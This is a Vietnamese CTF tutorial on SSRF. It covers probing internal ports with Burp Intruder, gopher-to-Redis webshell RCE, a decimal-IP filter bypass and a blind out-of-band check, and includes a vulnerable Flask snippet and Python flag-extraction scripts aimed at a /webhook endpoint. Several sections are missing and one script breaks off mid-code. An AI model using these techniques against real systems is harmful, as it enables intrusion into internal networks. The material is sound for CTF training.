SSRF — Server-Side Request Forgery

Khi server tự đi tải 1 URL do bạn cung cấp (webhook, fetch ảnh từ link, tạo PDF từ URL) — bạn có thể ép nó gọi tới những địa chỉ chỉ server mới với tới được (dịch vụ nội bộ như Redis, database, API admin) mà chính bạn không thể truy cập trực tiếp từ bên ngoài.

00 / TÓM TẮT 1 PHÚT

SSRF là gì, để làm gì?

Nhiều chức năng web cần server tự đi "lấy hộ" 1 thứ gì đó từ URL do người dùng cung cấp: tải ảnh đại diện từ link, tạo preview link, convert URL thành PDF, gọi webhook. Nếu bạn đổi URL đó thành http://127.0.0.1:6379 (Redis nội bộ) hay http://admin-api:8080/secret, server sẽ tự "đi tới đó thay bạn" — bạn đọc được dữ liệu/gọi được dịch vụ mà bình thường tường lửa chặn truy cập trực tiếp từ Internet, vì request này xuất phát từ chính server, không phải từ máy bạn.

Nếu chỉ nhớ một điều SSRF biến server thành "proxy miễn phí" cho bạn vào mạng nội bộ. Luôn thử trước: http://127.0.0.1/, http://localhost/, và tên service nội bộ đoán được theo convention Docker Compose (http://web:5000, http://redis:6379, http://db:3306).
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ SSRF
🚩 Nhận ra trong 30 giây Chức năng nhận URL làm tham số: webhook, "URL ảnh đại diện", "tạo PDF từ URL", "preview link". Thử gửi http://127.0.0.1:80/ → nếu response khác hẳn (thành công/lỗi khác với URL ngoài) ⟹ server thực sự đi fetch URL đó.
✅ Tiền đề cần có Response có phản hồi lại nội dung URL đã fetch (không bắt buộc, nhưng dễ xác nhận hơn nhiều — nếu không, cần kỹ thuật blind, xem mục 06).
🔍 Dò nhanh bằng Burp Repeater: thử lần lượt 127.0.0.1, localhost, cổng phổ biến (80,3000,5000,6379,8080,9200) — so sánh response time/nội dung để biết cổng nào có dịch vụ đang chạy.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Mạng nội bộ (internal network) — trong môi trường Docker/K8s, các service (web app, database, cache Redis) thường chạy trong 1 mạng riêng, chỉ gọi được lẫn nhau qua tên service (không phải IP public), và KHÔNG mở ra Internet — chỉ server trong mạng đó mới gọi tới được.
Docker Compose service name — khi dùng Docker Compose, mỗi container có thể gọi container khác bằng đúng tên khai báo trong file docker-compose.yml làm hostname (vd service tên redis thì container khác gọi được bằng http://redis:6379).
Gopher protocol — giao thức cũ, cho phép gửi byte tùy ý tới 1 cổng/địa chỉ qua URL dạng gopher://host:port/_data. Vì nhiều dịch vụ nội bộ (Redis, Memcached, SMTP) giao tiếp bằng giao thức văn bản đơn giản, gopher cho phép bạn "giả lập" gửi lệnh thật của dịch vụ đó qua chính request SSRF.

Code hay viết (thiếu validate URL đích):

# Python/Flask — tải ảnh từ URL người dùng cung cấp, không kiểm tra đích
url = request.form['url']
resp = requests.get(url)   # gọi tới BẤT KỲ URL nào, kể cả nội bộ
return resp.content
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Server tin tưởng mù quáng URL do người dùng cung cấp

Lập trình viên nghĩ "tính năng này chỉ dùng để tải ảnh/webhook từ Internet", nên không nghĩ tới việc kiểm tra xem URL có trỏ vào chính mạng nội bộ của hệ thống hay không. Về bản chất, thư viện HTTP client (requests, axios, curl...) không phân biệt "URL bên ngoài" với "URL nội bộ" — nó chỉ thấy 1 địa chỉ IP/hostname và kết nối tới. Việc giới hạn đích chỉ xảy ra nếu lập trình viên chủ động thêm allowlist/kiểm tra IP — bước này rất hay bị bỏ qua vì "ai lại gửi URL nội bộ làm gì".

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Server là "trạm trung chuyển" bạn mượn quyền truy cập mạng

Điều này giải thích vì sao SSRF đặc biệt mạnh trong môi trường Docker Compose của CTF: mọi service (app, database, cache...) thường nằm chung 1 docker network, server web luôn có đường kết nối hợp lệ tới các service khác (đó là thiết kế bình thường của hệ thống) — SSRF chỉ đơn giản là "mượn" đúng con đường kết nối hợp lệ đó cho mục đích của bạn.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Dò port/service nội bộ bằng Intruder
  1. Bắt request có tham số URL, Send to Repeater, xác nhận http://127.0.0.1:80/ cho response khác với URL ngoài.
  2. Send to Intruder, đánh dấu §80§ trong http://127.0.0.1:§80§/.
  3. Nạp payload list cổng phổ biến: 22,80,443,3000,3306,5000,5432,6379,8080,8443,9200,27017.
  4. Start attack, sắp xếp theo Response time hoặc Length — cổng có dịch vụ thật thường phản hồi khác (nhanh hơn/nội dung khác) so với cổng đóng (timeout hoặc connection refused).

C. SSRF → RCE qua gopher (Redis)

Nếu dò ra Redis nội bộ không có mật khẩu (rất phổ biến trong CTF), gopher cho phép gửi lệnh Redis thật qua URL, có thể dẫn tới ghi file (webshell) nếu Redis dùng chung volume với webroot. Dùng công cụ sinh payload ở mục 07 thay vì tự tính byte tay.

D. Blind SSRF (không có response)

Dùng timing (so sánh thời gian phản hồi giữa port mở/đóng) hoặc OOB — trỏ URL ra 1 listener của bạn (giống kỹ thuật bài XXE mục 06.B), xem log server có request tới không để xác nhận SSRF tồn tại dù không đọc được nội dung response.

(B) Bản gọn chắc — dò nhiều service, trích thẳng flag

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
TARGETS = ["http://127.0.0.1:5000/admin/flag", "http://web:5000/admin/flag",
           "http://127.0.0.1/admin/flag"]

def exploit_ssrf(host):
    for t in TARGETS:
        r = requests.post(f"http://{host}/webhook", data={"url": t}, timeout=5)
        m = FLAG_RE.search(r.text)
        if m:
            return m.group()
    return None

print("FLAG:", exploit_ssrf("TARGET_IP"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
TARGET_URL = "http://127.0.0.1:5000/admin/flag"   # đã xác nhận ăn từ bước thử tay

def exploit_ssrf(host):
    try:
        r = requests.post(f"http://{host}/webhook", data={"url": TARGET_URL}, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

if __name__ == "__main__":

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay trên Burp, từ xác nhận SSRF tới gọi đúng endpoint nội bộ chứa flag.

Gợi ý nếu kẹtSo sánh response của URL ngoài (Google) với URL nội bộ để thấy rõ sự khác biệt trước khi đoán tên service.

⭐⭐ Đổi 1 biến: app chặn chuỗi 127.0.0.1 theo blacklist đơn giản. Dùng 1 trong các biểu diễn IP thay thế ở mục 06.B để bypass.

Gợi ý nếu kẹthttp://2130706433/ (decimal) thường dễ qua filter regex chỉ khớp đúng dạng chấm thập phân.

⭐⭐⭐⭐ Tự nghĩ: đã xác nhận có Redis nội bộ không mật khẩu, nhưng Redis không chia sẻ volume với webroot (ghi webshell qua Redis không hoạt động). Nghĩ 2 cách khác để khai thác được giá trị từ Redis dù không đạt RCE.

Gợi ý nếu kẹt(1) Dùng lệnh Redis KEYS * + GET qua gopher để đọc trực tiếp dữ liệu cache (có thể chứa session/flag cache); (2) nếu app dùng Redis cho session, tìm cách ghi/sửa session của user khác qua Redis trực tiếp (session fixation qua SSRF).
